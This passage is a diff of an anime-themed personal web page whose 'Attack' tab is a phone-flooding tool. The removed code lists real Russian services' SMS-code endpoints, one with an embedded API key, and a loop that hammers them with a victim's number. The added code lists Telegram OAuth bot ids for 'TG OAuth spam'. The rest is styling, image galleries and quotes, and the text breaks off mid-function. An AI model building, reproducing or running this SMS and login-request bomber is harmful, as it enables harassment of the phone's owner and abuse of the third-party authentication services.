+    .history-item .h-region{font-size:.7rem;color:var(--accent)}
+    .history-item .h-stats{display:flex;gap:1rem;font-size:.75rem;color:var(--muted)}
+    .history-item .h-stats .ok{color:#5ee8a0}
+    .history-item .h-stats .fail{color:#ff6b6b}
+    .ip-check-table{width:100%;border-collapse:collapse;margin-top:1rem}
+    .ip-check-table td{padding:0.5rem 0.8rem;border-bottom:1px solid var(--border);font-size:0.85rem}
+    .ip-check-table td:first-child{color:var(--muted);width:55%}
+    .ip-check-table td:last-child{font-weight:600}
+    .ip-check-table .ok{color:#5ee8a0}
+    .ip-check-table .warn{color:var(--orange)}
+    .ip-check-table .bad{color:#ff6b6b}
+    .music-wrap{text-align:center}
+    .music-title{font-family:var(--fh);font-size:1.5rem;color:var(--accent);margin-bottom:.5rem}
+    .music-sub{color:var(--muted);font-size:.85rem;margin-bottom:1.5rem}
+    audio{width:100%;border-radius:14px;accent-color:var(--accent);filter:drop-shadow(0 0 8px rgba(255,183,197,.25))}
+    .now-playing{margin-top:1rem;font-size:.82rem;color:var(--muted);display:flex;align-items:center;justify-content:center;gap:.55rem}
+    .now-playing span{width:9px;height:9px;border-radius:50%;background:var(--accent);display:inline-block;animation:pulseNow 1.6s ease-in-out infinite}
+    @keyframes pulseNow{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.5);opacity:.5}}
+    .gallery-title{font-family:var(--fh);font-size:1.4rem;color:var(--accent);margin-bottom:.4rem}
+    .gallery-sub{color:var(--muted);font-size:.83rem;margin-bottom:1rem}
+    #gallery{display:grid;grid-template-columns:repeat(auto-fill,minmax(155px,1fr));gap:1rem}
+    #gallery img{width:100%;aspect-ratio:1;object-fit:cover;border-radius:16px;border:1.5px solid var(--border);transition:all .32s;cursor:pointer}
+    #gallery img:hover{transform:scale(1.06) rotate(1.5deg);box-shadow:0 0 24px rgba(255,183,197,.45);border-color:var(--accent)}
+    .neko-wrap{position:fixed;bottom:1.3rem;right:1.3rem;z-index:150;display:flex;flex-direction:column;align-items:center;gap:.4rem}
+    .neko-tip{background:var(--card);border:1px solid var(--border);color:var(--accent);font-size:.65rem;padding:.25rem .7rem;border-radius:2rem;backdrop-filter:blur(10px);pointer-events:none;opacity:0;transition:opacity .3s;white-space:nowrap;box-shadow:var(--shadow)}
+    .neko-corner{width:72px;height:72px;border-radius:50%;border:2.5px solid var(--accent);overflow:hidden;box-shadow:0 0 22px rgba(255,183,197,.55);cursor:pointer;transition:all .3s}
+    .neko-corner:hover{transform:scale(1.12);box-shadow:0 0 35px rgba(255,183,197,.75)}
+    .neko-corner:hover + .neko-tip{opacity:1}
+    .neko-corner img{width:100%;height:100%;object-fit:cover;transition:transform .4s}
+    .neko-corner:hover img{transform:scale(1.18)}
+    .tg-service-btn{display:inline-block;margin:.3rem;padding:.5rem 1rem;background:rgba(199,125,255,.08);border:1px solid var(--border);border-radius:20px;color:var(--muted);cursor:pointer;font-size:.8rem;transition:.2s}
+    .tg-service-btn:hover{background:var(--accent);color:#fff;border-color:var(--accent)}
+    .tg-service-btn.used{opacity:.5;pointer-events:none}
+    .admin-panel{display:none;margin-top:1.5rem;padding:1rem;background:rgba(255,107,107,.05);border:1px solid rgba(255,107,107,.2);border-radius:16px}
+    .admin-panel.active{display:block}
+    @media (max-width:660px){.profile{flex-direction:column;gap:1.6rem}.bio-name{font-size:1.6rem}.card{padding:1.4rem}.avatar{width:125px;height:125px}.btn{font-size:.76rem;padding:.66rem 1.1rem}#gallery{grid-template-columns:repeat(auto-fill,minmax(120px,1fr))}}
+    ::-webkit-scrollbar{width:6px}
+    ::-webkit-scrollbar-track{background:var(--bg)}
+    ::-webkit-scrollbar-thumb{background:var(--accent);border-radius:3px}
   </style>
 </head>
 <body>
-
-<div id="vfx-bg"></div>
+<canvas id="vfx-canvas"></canvas>
 
 <div class="fixed-top">
-  <button class="icon-btn" id="themeToggle"  title="Сменить тему">🌸</button>
+  <button class="icon-btn" id="themeToggle" title="Сменить тему">🌸</button>
   <button class="icon-btn" id="animeModeBtn" title="Аниме-режим">✨</button>
 </div>
 
 <div class="neko-wrap">
   <div class="neko-corner" id="nekoCorner" title="Новый котик!">
-    <img id="nekoImg" src="" alt="neko" style="opacity:0; transition: opacity .5s;">
+    <img id="nekoImg" src="" alt="neko" loading="lazy" style="opacity:0; transition: opacity .5s;">
   </div>
   <div class="neko-tip">🐱 нажми для котика!</div>
 </div>
 
 <div class="page-wrap">
   <div class="container">
-
     <nav class="tabs">
       <div class="tab active" data-tab="bio">🌸 Био</div>
-      <div class="tab"        data-tab="attack">⚡ Attack</div>
-      <div class="tab"        data-tab="ip">🔍 IP</div>
-      <div class="tab"        data-tab="music">🎀 Музыка</div>
-      <div class="tab"        data-tab="gallery">🎴 Галерея</div>
+      <div class="tab" data-tab="attack">⚡ Attack</div>
+      <div class="tab" data-tab="ip">🔍 IP</div>
+      <div class="tab" data-tab="music">🎀 Музыка</div>
+      <div class="tab" data-tab="gallery">🎴 Галерея</div>
     </nav>
 
     <!-- Био -->
@@ -685,7 +162,7 @@
         <div class="profile">
           <div class="avatar-wrap">
             <div class="avatar">
-              <img id="avatarImg" src="" alt="GOD_AE86" style="opacity:0; transition: opacity .6s;">
+              <img id="avatarImg" src="" alt="GOD_AE86" loading="lazy" style="opacity:0; transition: opacity .6s;">
             </div>
             <div class="avatar-ring"></div>
             <div class="avatar-ring2"></div>
@@ -702,7 +179,7 @@
             </div>
             <div class="quote-box">
               <div class="quote-text" id="quoteText">Загружаем цитату…</div>
-              <div class="quote-src"  id="quoteSrc"></div>
+              <div class="quote-src" id="quoteSrc"></div>
               <button class="quote-btn" id="newQuoteBtn">🔄 новая цитата</button>
             </div>
             <div class="social-links">
@@ -710,25 +187,22 @@
                 <svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.161c-.18 1.897-.962 6.502-1.359 8.627-.168.9-.5 1.201-.82 1.23-.697.064-1.226-.46-1.901-.903-1.056-.692-1.653-1.123-2.678-1.799-1.185-.781-.417-1.21.258-1.911.177-.184 3.247-2.977 3.307-3.23.007-.032.015-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.139-5.062 3.345-.479.329-.913.489-1.302.481-.428-.009-1.252-.242-1.865-.441-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.831-2.529 6.998-3.015 3.333-1.386 4.025-1.627 4.476-1.635.099-.002.321.023.465.141.12.098.153.228.169.321.015.094.034.307.019.474z"/></svg>
               </a>
               <a href="https://t.me/+lseqUuDD40c0N2Ni" class="social-btn" target="_blank" title="Канал">👥</a>
-              <a href="https://t.me/god_internet"      class="social-btn" target="_blank" title="Ещё">📡</a>
+              <a href="https://t.me/god_internet" class="social-btn" target="_blank" title="Ещё">📡</a>
             </div>
           </div>
         </div>
       </div>
     </div>
 
-    <!-- ⚡ Attack -->
+    <!-- ⚡ Attack (объединён с TG Auth) -->
     <div class="tab-content" id="tab-attack">
       <div class="card">
-        <div class="attack-title">⚡ Атака</div>
-        <div class="services-status" id="servicesStatus">Загрузка сервисов...</div>
-
+        <div class="attack-title">⚡ ОАтака</div>
         <div class="region-chips" id="regionChips">
           <span class="region-chip active" data-r="ru">RU</span>
           <span class="region-chip" data-r="by">BY</span>
           <span class="region-chip" data-r="kz">KZ</span>
         </div>
-
         <div class="form-row">
           <div class="inp-group">
             <label>Номер телефона</label>
@@ -738,12 +212,13 @@
             <label>Длительность (сек)</label>
             <input type="number" id="attackDur" value="60" min="10">
           </div>
-          <div class="inp-group">
-            <label>Прокси (ip:port) — не используется</label>
-            <input type="text" id="attackProxy" placeholder="ip:port" disabled>
-          </div>
         </div>
-
+        <div style="display:flex; align-items:center; gap:1rem; margin-bottom:1rem; flex-wrap:wrap;">
+          <label style="display:flex; align-items:center; gap:.5rem; color:var(--muted); font-size:.85rem;">
+            <input type="checkbox" id="tgSpawnToggle"> TG OAuth спам
+          </label>
+        </div>
+        <div style="margin-bottom:1rem;" id="tgServiceButtons"></div>
         <div style="display:flex; gap:1rem; margin-bottom:1.5rem; flex-wrap:wrap;">
           <button class="btn btn-primary" id="attackStartBtn">▶ Запустить атаку</button>
           <button class="btn btn-outline" id="attackStopBtn" style="display:none;">⏹ Остановить</button>
@@ -751,6 +226,19 @@
           <button class="btn btn-outline" id="exportBtn">📤 Экспорт</button>
           <button class="btn btn-outline" id="importBtn">📥 Импорт</button>
           <button class="btn btn-outline" id="clearHistoryBtn">🗑 Сброс истории</button>
+        </div>
+
+        <!-- Админ-панель (скрытая) -->
+        <div class="admin-panel" id="adminPanel">
+          <div class="attack-title">🔑 Админ-панель</div>
+          <p style="color:var(--muted); font-size:.85rem; margin-bottom:1rem;">Блокировка доступа к сайту по IP</p>
+          <div style="display:flex; gap:.5rem; margin-bottom:1rem;">
+            <input type="text" id="banIpInput" placeholder="IP-адрес" style="flex:1; padding:.5rem; background:var(--card); border:1px solid var(--border); border-radius:10px; color:var(--text);">
+            <button class="btn btn-outline" id="addBanBtn">Забанить</button>
+            <button class="btn btn-outline" id="clearBanBtn">Очистить</button>
+          </div>
+          <div id="banList"></div>
+          <p style="font-size:.7rem; color:var(--muted); margin-top:.5rem;">Текущий IP: <span id="adminCurrentIp">...</span></p>
         </div>
 
         <div class="history-list">
@@ -778,12 +266,11 @@
       <div class="card music-wrap">
         <div class="music-title">🎀 Аниме‑Плеер 🎀</div>
         <div class="music-sub">загрузи <code>track.mp3</code> в папку с сайтом</div>
-        <audio controls>
+        <audio controls id="audioPlayer">
           <source src="track.mp3" type="audio/mpeg">
         </audio>
-        <div class="now-playing">
-          <span></span> сейчас играет: неко-бит ♪
-        </div>
+        <div class="now-playing"><span></span> сейчас играет: неко-бит ♪</div>
+        <div id="audioFallback" style="display:none; color:#ff6b6b; margin-top:1rem;">⚠️ Файл track.mp3 не найден</div>
       </div>
     </div>
 
@@ -795,19 +282,14 @@
         <div id="gallery"></div>
       </div>
     </div>
-
   </div>
 </div>
 
 <!-- Оверлей атаки -->
 <div class="atk-overlay" id="atkOverlay">
   <div style="font-size:1rem; color:var(--accent); margin-bottom:2rem;" id="atkRegionLabel">RU</div>
-  <div class="atk-timer">
-    <span id="atkTimeLeft">60</span><small>s</small>
-  </div>
-  <div class="atk-progress">
-    <div class="atk-progress-fill" id="atkProgressFill"></div>
-  </div>
+  <div class="atk-timer"><span id="atkTimeLeft">60</span><small>s</small></div>
+  <div class="atk-progress"><div class="atk-progress-fill" id="atkProgressFill"></div></div>
   <div class="atk-stats">
     <div class="atk-stat"><b id="atkTotal">0</b><small>всего</small></div>
     <div class="atk-stat"><b id="atkSuccess" style="color:#5ee8a0;">0</b><small>успешно</small></div>
@@ -817,515 +299,734 @@
 </div>
 
 <script>
-// ========== ФОН, ТЕМА, ТАБЫ, ГАЛЕРЕЯ, АВАТАР, ЦИТАТЫ, НЕКО ==========
-(function() {
-  const vfxBg = document.getElementById('vfx-bg');
-  const PETAL_N = 22, STAR_N = 38;
+// ========== КОНФИГУРАЦИЯ СЕРВИСОВ TG OAUTH ==========
+const tgAuthServices = [
+  { name: 'FRAGMENT', bot_id: '5444323279', origin: 'https://fragment.com' },
+  { name: 'KUPIKOD', bot_id: '5731754199', origin: 'https://steam.kupikod.com' },
+  { name: 'COMBOT', bot_id: '210944655', origin: 'https://combot.org' },
+  { name: 'TELEGRAMBOT.BIZ', bot_id: '319709511', origin: 'https://telegrambot.biz' },
+  { name: 'BOT-T', bot_id: '1199558236', origin: 'https://bot-t.com' },
+  { name: 'LZT.MARKET', bot_id: '5709824482', origin: 'https://lzt.market' },
+  { name: 'TG-STORE', bot_id: '1803424014', origin: 'https://ru.telegram-store.com' },
+  { name: 'SPOT.UZ', bot_id: '5463728243', origin: 'https://www.spot.uz' },
+  { name: '1WIN', bot_id: '6708902161', origin: 'https://ourauthpoint777.com' },
+  { name: 'PRESSCODE', bot_id: '1852523856', origin: 'https://cabinet.presscode.app' }
+];
 
-  function mkPetals() {
-    vfxBg.innerHTML = '';
-    for (let i = 0; i < PETAL_N; i++) {
-      const el = document.createElement('div');
-      el.className = 'petal';
-      el.style.cssText = `
-        left:${Math.random()*100}vw;
-        width:${8+Math.random()*11}px;
-        height:${10+Math.random()*13}px;
-        animation-duration:${7+Math.random()*11}s;
-        animation-delay:${Math.random()*14}s;
-        opacity:${(.42+Math.random()*.45).toFixed(2)}
-      `.replace(/\s+/g,';');
-      vfxBg.appendChild(el);
-    }
-  }
-  function mkStars() {
-    vfxBg.innerHTML = '';
-    for (let i = 0; i < STAR_N; i++) {
-      const el = document.createElement('div');
-      el.className = 'star-vfx';
-      const s = `${2+Math.random()*5}px`;
-      el.style.cssText = `
-        left:${Math.random()*100}vw;
-        width:${s};height:${s};
-        animation-duration:${3+Math.random()*8}s;
-        animation-delay:${Math.random()*9}s
-      `.replace(/\s+/g,';');
-      vfxBg.appendChild(el);
-    }
-  }
-  mkPetals();
+// ========== CANVAS VFX ==========
+const canvas = document.getElementById('vfx-canvas');
+const ctx = canvas.getContext('2d');
+let petals = [], stars = [], animationId;
+let usePetals = true;
 
-  // Тема
-  const html = document.documentElement;
-  const savedTheme = localStorage.getItem('theme') || 'dark';
-  html.setAttribute('data-theme', savedTheme);
-  document.getElementById('themeToggle').textContent = savedTheme === 'dark' ? '🌸' : '🌙';
-  document.getElementById('themeToggle').addEventListener('click', () => {
-    const nxt = html.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
-    html.setAttribute('data-theme', nxt);
-    localStorage.setItem('theme', nxt);
-    document.getElementById('themeToggle').textContent = nxt === 'dark' ? '🌸' : '🌙';
-  });
+function resizeCanvas() {
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+}
+window.addEventListener('resize', resizeCanvas);
+resizeCanvas();
 
-  // Аниме-режим
-  let animeOn = false;
-  document.getElementById('animeModeBtn').addEventListener('click', () => {
-    animeOn = !animeOn;
-    html.setAttribute('data-anime', animeOn ? 'on' : 'off');
-    document.getElementById('animeModeBtn').textContent = animeOn ? '💫' : '✨';
-    animeOn ? mkStars() : mkPetals();
-  });
-
-  // Табы
-  document.querySelectorAll('.tab').forEach(tab => {
-    tab.addEventListener('click', () => {
-      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-      tab.classList.add('active');
-      document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-      document.getElementById('tab-' + tab.dataset.tab).classList.add('active');
-      if (tab.dataset.tab === 'bio') fetchQuote();
-      if (tab.dataset.tab === 'attack') renderHistory();
-      if (tab.dataset.tab === 'ip') runIpCheck();
-    });
-  });
-
-  function setImageWithFallback(imgElement, src, fallbackSvg) {
-    imgElement.src = src || '';
-    imgElement.onerror = function() {
-      if (fallbackSvg) imgElement.src = 'data:image/svg+xml,' + encodeURIComponent(fallbackSvg);
-      imgElement.style.opacity = '1';
-    };
-    imgElement.onload = function() {
-      imgElement.style.opacity = '1';
-    };
-  }
-
-  const AVATAR_FALLBACK = `<svg xmlns="http://www.w3.org/2000/svg" width="155" height="155" viewBox="0 0 155 155"><rect fill="#22133a" width="155" height="155"/><text x="77" y="80" text-anchor="middle" fill="#c77dff" font-size="30">★</text></svg>`;
-  const WAIFU_FALLBACK = `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200"><rect fill="#1a1025" width="200" height="200"/><text x="100" y="100" text-anchor="middle" fill="#ffb7c5" font-size="20">🌸</text></svg>`;
-
-  const avatarImg = document.getElementById('avatarImg');
-  (async function fetchAvatar() {
-    const types = ['waifu','neko','shinobu','megumin'];
-    const t = types[Math.floor(Math.random() * types.length)];
-    let url = '';
-    try {
-      const r = await fetch(`https://api.waifu.pics/sfw/${t}`);
-      if (r.ok) { const d = await r.json(); url = d.url; }
-    } catch(e) {}
-    if (!url) {
-      try {
-        const r = await fetch('https://api.waifu.pics/sfw/waifu');
-        if (r.ok) { const d = await r.json(); url = d.url; }
-      } catch(e) {}
-    }
-    setImageWithFallback(avatarImg, url, AVATAR_FALLBACK);
-  })();
-
-  // Галерея
-  const gallery = document.getElementById('gallery');
-  async function loadGalleryImage(imgElement) {
-    const categories = ['waifu','neko','shinobu','megumin','awoo','cuddle','hug','pat','smile','wave'];
-    const cat = categories[Math.floor(Math.random() * categories.length)];
-    try {
-      const resp = await fetch(`https://api.waifu.pics/sfw/${cat}`);
-      if (resp.ok) {
-        const data = await resp.json();
-        if (data && data.url) {
-          setImageWithFallback(imgElement, data.url, WAIFU_FALLBACK);
-          return;
-        }
-      }
-    } catch(e) {}
-    imgElement.style.display = 'none';
-  }
-  (function buildGallery() {
-    gallery.innerHTML = '';
-    for (let i = 0; i < 4; i++) {
-      const img = document.createElement('img');
-      img.alt = `аниме ${i+1}`;
-      img.style.opacity = '0.4';
-      gallery.appendChild(img);
-      loadGalleryImage(img);
-    }
-  })();
-
-  // Цитаты
-  const quotes = [
-    { q:'Если не веришь в себя, то и не стоит начинать.', c:'Макака', a:'Доктор Стоун' },
-    { q:'Настоящая сила — в умении защищать.',           c:'Аска',   a:'Евангелион' },
-    { q:'Неважно, сколько у тебя таланта. Главное — желание.', c:'Мидория', a:'Моя геройская академия' },
-    { q:'Даже в самой глубокой тьме можно найти свет.',  c:'Тандзиро', a:'Клинок, рассекающий демонов' },
-  ];
-  function fetchQuote() {
-    const f = quotes[Math.floor(Math.random() * quotes.length)];
-    document.getElementById('quoteText').textContent = `"${f.q}"`;
-    document.getElementById('quoteSrc').textContent  = `— ${f.c} · ${f.a}`;
-  }
-  fetchQuote();
-  document.getElementById('newQuoteBtn').addEventListener('click', fetchQuote);
-
-  // Нeко
-  const nekoImg = document.getElementById('nekoImg');
-  async function fetchNeko() {
-    nekoImg.style.opacity = '0.3';
-    let url = '';
-    try {
-      const r = await fetch('https://nekos.life/api/v2/img/meow');
-      if (r.ok) { const d = await r.json(); url = d.url; }
-    } catch(e) {}
-    if (!url) {
-      try {
-        const r = await fetch('https://api.waifu.pics/sfw/neko');
-        if (r.ok) { const d = await r.json(); url = d.url; }
-      } catch(e) {}
-    }
-    setImageWithFallback(nekoImg, url, WAIFU_FALLBACK);
-  }
-  document.getElementById('nekoCorner').addEventListener('click', fetchNeko);
-  fetchNeko();
-  setInterval(fetchNeko, 30000);
-
-  // ========== ЗАГРУЗКА services.json с фолбэком ==========
-  let servicesDB = { ru: [], by: [], kz: [] };
-  window.servicesLoaded = false;
-
-  // Резервный список (РФ), чтобы атака работала даже без файла
-  const FALLBACK_RU = [
-    { method:"POST", url:"https://api.sunlight.net/modules/customer-auth/v1/web/send/", type:"json", body:{phone:"{wp}",source:"web_auth_page"} },
-    { method:"POST", url:"https://api.start.ru/auth/phone/check?apikey=a20b12b279f744f2b3c7b5c5400c4eb5", type:"json", body:{phone:"{ru}"} },
-    { method:"POST", url:"https://api.litres.ru/foundation/api/auth/phone-available", type:"json", body:{country_code:"RU",phone:"{raw}"} },
-    { method:"POST", url:"https://lenta.com/api/v1/authentication/requestValidationCode", type:"json", body:{phone:"{wp}"} },
-    { method:"POST", url:"https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", type:"json", body:{phone:"{wp}"} },
-  ];
-
-  async function loadServices() {
-    const statusEl = document.getElementById('servicesStatus');
-    try {
-      const resp = await fetch('services.json');
-      if (resp.ok) {
-        const data = await resp.json();
-        if (data && typeof data === 'object') {
-          ['ru','by','kz'].forEach(region => {
-            if (Array.isArray(data[region])) servicesDB[region] = data[region];
-          });
-        }
-      } else {
-        throw new Error('Не удалось загрузить services.json');
-      }
-    } catch(e) {
-      console.warn('services.json не загружен, использую резервные сервисы РФ');
-      servicesDB.ru = FALLBACK_RU;
-    }
-    window.servicesLoaded = true;
-    if (statusEl) {
-      statusEl.textContent = `Сервисов загружено: RU ${servicesDB.ru.length}, BY ${servicesDB.by.length}, KZ ${servicesDB.kz.length}`;
-      statusEl.style.color = 'var(--green)';
-    }
-  }
-  loadServices(); // асинхронно
-
-  // ========== ATTACK LOGIC ==========
-  function formatPhone(phone, type) {
-    const clean = phone.replace(/\D/g, '');
-    switch(type) {
-      case 'wp': case 'cp': case 'ru': case 'sp': return '+' + clean;
-      default: return clean;
-    }
-  }
-
-  function applyPlaceholders(template, phone) {
-    return template.replace(/\{(\w+)\}/g, (_, key) => {
-      if (key === 'rand_name') return 'Иван';
-      if (key === 'rand_surname') return 'Петров';
-      if (key === 'rand_email') return 'user@mail.ru';
-      if (key === 'rand_hex32') return 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';
-      if (key === 'rand_days') return '5';
-      if (key === 'rand_int100_999') return '500';
-      if (key === 'rand_hex26') return 'abcdefabcdefabcdefabcdef';
-      return formatPhone(phone, key);
+function initPetals(count = 22) {
+  petals = [];
+  for (let i = 0; i < count; i++) {
+    petals.push({
+      x: Math.random() * canvas.width,
+      y: Math.random() * canvas.height - canvas.height,
+      size: 8 + Math.random() * 11,
+      speed: 0.5 + Math.random() * 1.5,
+      rotation: Math.random() * Math.PI * 2,
+      rotSpeed: (Math.random() - 0.5) * 0.05,
+      opacity: 0.42 + Math.random() * 0.45
     });
   }
+}
 
-  async function sendServiceRequest(service, phone, signal) {
-    let url = service.url;
-    const method = service.method || 'POST';
-    const headers = {};
-    let body = null;
-
-    if (service.params && Object.keys(service.params).length > 0) {
-      const urlObj = new URL(url);
-      Object.entries(service.params).forEach(([k, v]) => {
-        urlObj.searchParams.set(k, applyPlaceholders(String(v), phone));
-      });
-      url = urlObj.toString();
-    } else {
-      url = applyPlaceholders(url, phone);
-    }
-
-    if (service.headers) {
-      Object.entries(service.headers).forEach(([k, v]) => {
-        headers[k] = applyPlaceholders(String(v), phone);
-      });
-    }
-
-    if (service.type === 'json') {
-      body = JSON.stringify(service.body);
-      headers['Content-Type'] = 'application/json';
-      body = applyPlaceholders(body, phone);
-    } else if (service.type === 'form' && service.body) {
-      const params = new URLSearchParams();
-      Object.entries(service.body).forEach(([k, v]) => {
-        params.append(k, applyPlaceholders(String(v), phone));
-      });
-      body = params.toString();
-      headers['Content-Type'] = 'application/x-www-form-urlencoded';
-    }
-
-    try {
-      await fetch(url, { method, headers, body, mode: 'no-cors', signal });
-      return true;
-    } catch (err) {
-      if (err.name === 'AbortError') throw err;
-      return false;
-    }
+function initStars(count = 38) {
+  stars = [];
+  for (let i = 0; i < count; i++) {
+    stars.push({
+      x: Math.random() * canvas.width,
+      y: Math.random() * canvas.height - canvas.height,
+      size: 2 + Math.random() * 5,
+      speed: 1 + Math.random() * 2,
+      opacity: 0,
+      life: 0,
+      maxLife: 80 + Math.random() * 60
+    });
   }
+}
 
-  let attackRunning = false;
-  let attackAbortController = null;
-  let attackStats = { total: 0, success: 0, failed: 0 };
-  let attackStartTime = null;
-  let attackDuration = 0;
-  let attackRegion = 'ru';
+function drawPetals() {
+  petals.forEach(p => {
+    p.y += p.speed;
+    p.rotation += p.rotSpeed;
+    if (p.y > canvas.height + 60) {
+      p.y = -60;
+      p.x = Math.random() * canvas.width;
+    }
+    ctx.save();
+    ctx.translate(p.x, p.y);
+    ctx.rotate(p.rotation);
+    ctx.globalAlpha = p.opacity;
+    ctx.fillStyle = '#ffcfd9';
+    ctx.beginPath();
+    ctx.moveTo(0, 0);
+    ctx.bezierCurveTo(p.size, -p.size/2, p.size, p.size/2, 0, p.size);
+    ctx.bezierCurveTo(-p.size, p.size/2, -p.size, -p.size/2, 0, 0);
+    ctx.fill();
+    ctx.restore();
+  });
+}
 
-  document.getElementById('attackStartBtn').addEventListener('click', startAttack);
-  document.getElementById('attackStopBtn').addEventListener('click', stopAttack);
-  document.getElementById('atkStopOverlayBtn').addEventListener('click', stopAttack);
+function drawStars() {
+  stars.forEach(s => {
+    s.y += s.speed;
+    s.life++;
+    s.opacity = Math.sin((s.life / s.maxLife) * Math.PI);
+    if (s.life >= s.maxLife) {
+      s.y = -20;
+      s.x = Math.random() * canvas.width;
+      s.life = 0;
+    }
+    ctx.save();
+    ctx.globalAlpha = s.opacity;
+    ctx.fillStyle = getComputedStyle(document.documentElement).getPropertyValue('--accent').trim();
+    ctx.shadowColor = getComputedStyle(document.documentElement).getPropertyValue('--purple').trim();
+    ctx.shadowBlur = 6;
+    ctx.beginPath();
+    ctx.arc(s.x, s.y, s.size, 0, Math.PI*2);
+    ctx.fill();
+    ctx.restore();
+  });
+}
 
-  async function startAttack() {
-    if (attackRunning) return;
+function animate() {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  if (usePetals) {
+    drawPetals();
+  } else {
+    drawStars();
+  }
+  animationId = requestAnimationFrame(animate);
+}
 
-    // Ждём загрузку сервисов (макс. 5 секунд)
-    if (!window.servicesLoaded) {
-      const statusEl = document.getElementById('servicesStatus');
-      if (statusEl) statusEl.textContent = 'Ожидание загрузки сервисов...';
-      for (let i = 0; i < 20; i++) {
-        if (window.servicesLoaded) break;
-        await new Promise(r => setTimeout(r, 300));
-      }
-      if (!window.servicesLoaded) {
-        alert('Сервисы не загружены. Обновите страницу.');
+initPetals();
+initStars();
+animate();
+
+// ========== ТЕМА И АНИМЕ-РЕЖИМ ==========
+const html = document.documentElement;
+const savedTheme = localStorage.getItem('theme') || 'dark';
+html.setAttribute('data-theme', savedTheme);
+document.getElementById('themeToggle').textContent = savedTheme === 'dark' ? '🌸' : '🌙';
+
+document.getElementById('themeToggle').addEventListener('click', () => {
+  const nxt = html.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+  html.setAttribute('data-theme', nxt);
+  localStorage.setItem('theme', nxt);
+  document.getElementById('themeToggle').textContent = nxt === 'dark' ? '🌸' : '🌙';
+});
+
+let animeOn = false;
+document.getElementById('animeModeBtn').addEventListener('click', () => {
+  animeOn = !animeOn;
+  html.setAttribute('data-anime', animeOn ? 'on' : 'off');
+  document.getElementById('animeModeBtn').textContent = animeOn ? '💫' : '✨';
+  usePetals = !animeOn;
+  if (animeOn) initStars(); else initPetals();
+});
+
+// ========== ТАБЫ ==========
+document.querySelectorAll('.tab').forEach(tab => {
+  tab.addEventListener('click', () => {
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    tab.classList.add('active');
+    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+    document.getElementById('tab-' + tab.dataset.tab).classList.add('active');
+    if (tab.dataset.tab === 'bio') fetchQuote();
+    if (tab.dataset.tab === 'attack') { renderHistory(); populateTgServiceButtons(); }
+    if (tab.dataset.tab === 'ip') runIpCheck();
+  });
+});
+
+// ========== АВАТАР И ГАЛЕРЕЯ ==========
+function setImageWithFallback(imgElement, src, fallbackSvg) {
+  imgElement.src = src || '';
+  imgElement.onerror = function() {
+    if (fallbackSvg) imgElement.src = 'data:image/svg+xml,' + encodeURIComponent(fallbackSvg);
+    imgElement.style.opacity = '1';
+  };
+  imgElement.onload = function() { imgElement.style.opacity = '1'; };
+}
+
+const AVATAR_FALLBACK = `<svg xmlns="http://www.w3.org/2000/svg" width="155" height="155" viewBox="0 0 155 155"><rect fill="#22133a" width="155" height="155"/><text x="77" y="80" text-anchor="middle" fill="#c77dff" font-size="30">★</text></svg>`;
+const WAIFU_FALLBACK = `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200"><rect fill="#1a1025" width="200" height="200"/><text x="100" y="100" text-anchor="middle" fill="#ffb7c5" font-size="20">🌸</text></svg>`;
+
+async function fetchAvatar() {
+  const types = ['waifu','neko','shinobu','megumin'];
+  const t = types[Math.floor(Math.random() * types.length)];
+  let url = '';
+  try {
+    const r = await fetch(`https://api.waifu.pics/sfw/${t}`);
+    if (r.ok) { const d = await r.json(); url = d.url; }
+  } catch(e) {}
+  if (!url) {
+    try {
+      const r = await fetch('https://api.waifu.pics/sfw/waifu');
+      if (r.ok) { const d = await r.json(); url = d.url; }
+    } catch(e) {}
+  }
+  setImageWithFallback(document.getElementById('avatarImg'), url, AVATAR_FALLBACK);
+}
+fetchAvatar();
+
+async function loadGalleryImage(imgElement) {
+  const categories = ['waifu','neko','shinobu','megumin','awoo','cuddle','hug','pat','smile','wave'];
+  const cat = categories[Math.floor(Math.random() * categories.length)];
+  try {
+    const resp = await fetch(`https://api.waifu.pics/sfw/${cat}`);
+    if (resp.ok) {
+      const data = await resp.json();
+      if (data && data.url) {
+        setImageWithFallback(imgElement, data.url, WAIFU_FALLBACK);
         return;
       }
     }
+  } catch(e) {}
+  imgElement.style.display = 'none';
+}
 
-    const phone = document.getElementById('attackPhone').value.trim();
-    if (!phone) return alert('Введите номер телефона');
-    attackDuration = parseInt(document.getElementById('attackDur').value) || 60;
-    attackRegion = document.querySelector('#regionChips .region-chip.active')?.dataset.r || 'ru';
-    const services = servicesDB[attackRegion] || [];
+function buildGallery() {
+  const gallery = document.getElementById('gallery');
+  gallery.innerHTML = '';
+  for (let i = 0; i < 4; i++) {
+    const img = document.createElement('img');
+    img.alt = `аниме ${i+1}`;
+    img.loading = 'lazy';
+    img.style.opacity = '0.4';
+    gallery.appendChild(img);
+    loadGalleryImage(img);
+  }
+}
+buildGallery();
 
-    if (!services.length) {
-      alert('Нет сервисов для региона ' + attackRegion.toUpperCase());
-      return;
+// ========== ЦИТАТЫ ==========
+const quotes = [
+  { q:'Если не веришь в себя, то и не стоит начинать.', c:'Макака', a:'Доктор Стоун' },
+  { q:'Настоящая сила — в умении защищать.', c:'Аска', a:'Евангелион' },
+  { q:'Неважно, сколько у тебя таланта. Главное — желание.', c:'Мидория', a:'Моя геройская академия' },
+  { q:'Даже в самой глубокой тьме можно найти свет.', c:'Тандзиро', a:'Клинок, рассекающий демонов' },
+];
+function fetchQuote() {
+  const f = quotes[Math.floor(Math.random() * quotes.length)];
